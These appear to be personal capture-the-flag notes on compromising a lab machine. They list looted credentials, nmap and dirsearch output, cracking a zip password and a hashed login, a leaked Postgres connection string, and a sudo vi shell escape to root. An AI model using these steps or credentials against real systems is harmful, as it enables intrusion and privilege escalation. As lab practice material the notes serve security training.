# loot
administrator:MEGACORP_4dm1n!!
sql_svc:M3g4c0rp123
ftpuser:mc@F1l3ZilL4

# enum
```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports 10.10.10.27
```

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
    vsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py

22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login

* no useful exploits found, need to use other means

* ftp can login, found a backup.zip file, but is password protected
    * cannot upload file

* now explore the web
    * only a login page

* dirsearch, nothing useful
```
[11:11:17] 403 -  276B  - /.ht_wsr.txt
[11:11:17] 403 -  276B  - /.hta
[11:11:17] 403 -  276B  - /.htaccess-dev
[11:11:17] 403 -  276B  - /.htaccess-local
[11:11:17] 403 -  276B  - /.htaccess-marco
[11:11:17] 403 -  276B  - /.htaccess.BAK
[11:11:17] 403 -  276B  - /.htaccess.bak1
[11:11:17] 403 -  276B  - /.htaccess.old
[11:11:17] 403 -  276B  - /.htaccess.orig
[11:11:17] 403 -  276B  - /.htaccess.sample
[11:11:17] 403 -  276B  - /.htaccess.txt
[11:11:17] 403 -  276B  - /.htaccess.save
[11:11:17] 403 -  276B  - /.htaccess_extra
[11:11:17] 403 -  276B  - /.htaccess_orig
[11:11:17] 403 -  276B  - /.htaccess_sc
[11:11:17] 403 -  276B  - /.htaccessOLD
[11:11:17] 403 -  276B  - /.htaccessBAK
[11:11:17] 403 -  276B  - /.htaccessOLD2
[11:11:17] 403 -  276B  - /.htaccess~
[11:11:18] 403 -  276B  - /.htgroup
[11:11:18] 403 -  276B  - /.htpasswd-old
[11:11:18] 403 -  276B  - /.htpasswd_test
[11:11:18] 403 -  276B  - /.htusers
[11:11:18] 403 -  276B  - /.htpasswds
[11:12:34] 302 -  931B  - /dashboard.php  ->  index.php
[11:12:57] 200 -    2KB - /index.php
[11:12:58] 200 -    2KB - /index.php/login/
[11:13:05] 200 -    1KB - /license.txt
[11:13:41] 403 -  276B  - /server-status
[11:13:41] 403 -  276B  - /server-status/
```

* crack the zip file with zip2john

741852963



* credential 2cb42f8734ea607eefed3b70af13bbd3 reverted to 
admin:qwerty789

* dashboard.php
host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!

* can use this to find out which comnmand the user can exe using sudo, vi can be, so use :!/bin/bash to get the root shell

> python3 -c 'import pty;pty.spawn("/bin/bash")'
> sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

